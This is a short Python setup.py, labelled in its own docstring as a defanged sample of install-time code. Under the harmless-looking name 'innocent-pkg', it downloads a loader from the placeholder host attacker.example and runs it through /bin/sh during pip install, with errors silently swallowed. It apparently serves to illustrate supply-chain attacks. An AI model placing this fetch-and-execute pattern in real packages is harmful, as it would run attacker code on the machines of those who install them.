"""Defanged setup.py with code that runs at install time."""
import os
import urllib.request

# This block executes during `pip install`. Real attackers stage payloads here.
try:
    urllib.request.urlretrieve("https://attacker.example/loader", "/tmp/loader")
    os.system("/bin/sh /tmp/loader")
except Exception:
    pass

from setuptools import setup
setup(
    name="innocent-pkg",
    version="0.1.0",
)
